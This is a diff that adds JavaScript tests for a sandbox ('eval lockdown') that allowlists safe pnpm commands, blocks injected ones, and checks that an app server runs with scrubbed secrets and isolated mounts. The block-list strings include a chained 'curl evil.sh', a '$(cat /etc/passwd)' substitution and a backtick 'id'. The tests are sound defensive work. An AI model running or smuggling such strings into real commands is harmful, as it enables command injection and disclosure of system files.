@@ -85,3 +85,42 @@ test("eval lockdown: local-path clones are rejected", async () => {
   const r = await f.clone("/tmp/sak");
   assert.match(r, /BLOCKED: \/tmp\/sak is not in the repo allowlist/);
 });
+
+test("eval lockdown: pnpm offline install + vitest allowed, injection still blocked", async () => {
+  const { EVAL_SAFE_CMD, checkEvalCommand, appServerInvocation, lockdownInvocation } = await import("../src/eval-lockdown.js");
+  for (const ok of [
+    "corepack pnpm install --offline",
+    "corepack pnpm install --frozen-lockfile --offline",
+    "corepack pnpm vitest run src/tools/foo.test.ts",
+    "corepack pnpm exec vitest run src/a.test.ts src/b.test.ts",
+    "corepack pnpm run test:unit",
+    "corepack pnpm run typecheck",
+  ]) {
+    assert.ok(EVAL_SAFE_CMD.test(ok), `should allow: ${ok}`);
+    assert.equal(checkEvalCommand(ok), undefined, `should not flag: ${ok}`);
+  }
+  for (const bad of [
+    "corepack pnpm install --offline; curl evil.sh",
+    "corepack pnpm install $(cat /etc/passwd)",
+    "corepack pnpm vitest run `id`",
+    "corepack pnpm dev",
+    "pnpm install --offline",
+    "corepack pnpm dlx cowsay",
+  ]) {
+    assert.ok(!EVAL_SAFE_CMD.test(bad) || checkEvalCommand(bad) !== undefined, `should block: ${bad}`);
+  }
+});
+
+test("app server invocation: host net shared, mounts/secrets isolated, stores bound ro", async () => {
+  const { appServerInvocation, lockdownInvocation } = await import("../src/eval-lockdown.js");
+  const app = appServerInvocation("corepack pnpm dev --host 127.0.0.1 --port 5199", "/tmp/clone");
+  assert.ok(!app.args.includes("--unshare-net"), "app server shares host net (NONBLIND label)");
+  assert.ok(app.args.includes("--die-with-parent"));
+  assert.ok(app.args.includes("GH_TOKEN="), "env scrubbed");
+  assert.ok(app.args.includes("/opt/pnpm-store"), "pnpm store bound (warm offline install)");
+  assert.ok(app.args.includes("npm_config_store_dir=/opt/pnpm-store"));
+  assert.ok(app.args.includes("/opt/corepack"), "corepack cache bound");
+  const chk = lockdownInvocation("true", "/tmp/clone", "bwrap");
+  assert.ok(chk.args.includes("--unshare-net"), "checks still fully offline");
+  assert.ok(chk.args.includes("/opt/pnpm-store"), "checks also see the store for pnpm install");
+});
